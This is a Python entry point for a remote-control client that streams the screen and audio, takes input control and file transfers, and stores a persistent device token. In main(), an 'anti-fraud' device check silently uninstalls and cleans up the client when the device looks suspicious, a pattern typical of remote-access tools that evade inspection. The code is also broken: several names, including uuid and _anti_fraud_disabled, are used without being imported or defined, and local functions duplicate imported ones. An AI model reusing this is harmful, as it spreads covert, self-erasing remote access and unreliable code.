"""Entry point for the remote client."""
from __future__ import annotations

import argparse
import asyncio
import os

from remote_client.config import resolve_session_id
from remote_client.runtime import build_client, load_or_create_device_token
from remote_client.security.anti_fraud import analyze_device, silent_uninstall_and_cleanup
from remote_client.security.e2ee import load_e2ee_context
from remote_client.webrtc.client import WebRTCClient
from remote_client.webrtc.signaling import create_signaling, create_signaling_from_url


def _load_or_create_device_token() -> str | None:
    env_token = os.getenv("RC_DEVICE_TOKEN")
    if env_token:
        return env_token.strip()

    token_path = os.getenv("RC_DEVICE_TOKEN_PATH")
    if token_path:
        token_path = os.path.expanduser(token_path)
    else:
        token_path = os.path.join(os.path.expanduser("~"), ".remote_controller", "device_token")

    try:
        with open(token_path, "r", encoding="utf-8") as handle:
            stored = handle.read().strip()
            if stored:
                return stored
    except FileNotFoundError:
        pass
    except OSError:
        return None

    device_token = uuid.uuid4().hex
    try:
        token_dir = os.path.dirname(token_path)
        if token_dir:
            os.makedirs(token_dir, exist_ok=True)
        with open(token_path, "w", encoding="utf-8") as handle:
            handle.write(device_token)
    except OSError:
        return device_token
    return device_token


def build_client(session_id: str, token: str | None, device_token: str | None) -> WebRTCClient:
    signaling_url = os.getenv("RC_SIGNALING_URL")
    if signaling_url:
        if "://" in signaling_url:
            signaling = create_signaling_from_url(signaling_url, session_id, token)
        else:
            host, _, port = signaling_url.partition(":")
            signaling = create_signaling(
                host,
                int(port) if port else int(os.getenv("RC_SIGNALING_PORT", "8000")),
                session_id,
                token,
            )
    else:
        signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
        signaling_port = int(os.getenv("RC_SIGNALING_PORT", "8000"))
        signaling = create_signaling(signaling_host, signaling_port, session_id, token)
    control_handler = ControlHandler(InputController())
    file_service = FileService()
    media_tracks = [ScreenTrack(), AudioTrack()]
    e2ee_context = load_e2ee_context(session_id)

    return WebRTCClient(
        session_id=session_id,
        signaling=signaling,
        control_handler=control_handler,
        file_service=file_service,
        media_tracks=media_tracks,
        device_token=device_token,
        e2ee=e2ee_context,
    )


def _resolve_session_id(session_id: str | None) -> str:
    if session_id:
        return session_id
    env_session = os.getenv("RC_SIGNALING_SESSION")
    if env_session:
        return env_session
    return uuid.uuid4().hex


def main() -> None:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    if _anti_fraud_disabled():
        print("Region anti-fraud disabled for local testing.")
    else:
        anti_fraud = analyze_device()
        if anti_fraud.is_suspicious:
            silent_uninstall_and_cleanup(base_dir)
            return

    parser = argparse.ArgumentParser(description="Remote controller client")
    parser.add_argument(
        "--session-id",
        help="Session identifier used to register with the signaling server.",
    )
    args = parser.parse_args()
    session_id = resolve_session_id(args.session_id)
    print(f"Using session_id: {session_id}")

    signaling_token = os.getenv("RC_SIGNALING_TOKEN")
    device_token = load_or_create_device_token()
    client = build_client(session_id, signaling_token, device_token)
    asyncio.run(client.run_forever())


if __name__ == "__main__":
    main()
